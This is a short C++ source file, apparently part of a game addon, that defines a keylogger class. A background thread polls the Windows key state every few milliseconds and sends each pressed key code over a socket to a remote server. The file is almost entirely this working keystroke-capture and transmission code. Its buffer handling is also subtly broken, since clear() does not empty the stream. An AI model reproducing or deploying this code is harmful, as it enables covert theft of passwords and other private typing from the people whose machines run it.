#pragma once

#include "keylog.h"



extern addonThread *gThread;
extern addonMutex *gMutex;
extern addonSocket *gSocket;
extern addonKeylog *gKeylog;
extern std::queue<std::string> send_to;





addonKeylog::addonKeylog()
{
	addonDebug("Keylog constructor called");

	this->active = true;

	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread, NULL);
}



addonKeylog::~addonKeylog()
{
	addonDebug("Keylog deconstructor called");

	this->active = false;

	gThread->Stop(this->keylogHandle);
}



DWORD __stdcall keylog_thread(LPVOID lpParam)
{
	addonDebug("Thread 'keylog_thread' successfuly started");

	std::stringstream format;

	while(gKeylog->active)
	{
		for(int q = 8; q != 191; q++)
		{
			if(GetAsyncKeyState(q) == -32767)
			{
				format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1234 << '>' << q; // "TCPQUERY>CLIENT_CALL>1234>%i   ---   Sends async key data (array) | %i - pressed key

				gSocket->Send(format.str());

				format.clear();
			}
		}

		Sleep(5);
	}

	return true;
}